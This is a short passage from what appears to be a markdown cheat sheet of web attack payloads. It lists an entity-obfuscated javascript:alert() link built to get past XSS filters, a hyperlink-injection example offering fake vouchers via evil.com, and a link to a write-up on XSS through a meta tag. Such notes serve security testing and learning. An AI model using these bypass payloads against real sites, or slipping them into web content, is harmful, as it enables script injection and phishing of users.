-    <a href="aaa:bbb">x</a>
-    <a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>
-    [Click on me to claim 100$ vouchers](<https://evil.com>) -> Hyperlink Injection
-    ```
-    
 - **XSS in meta tag**
     
     - [ ] [XSS bypass using META tag in realestate.postnl.nl | by Prial Islam Khan | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308)
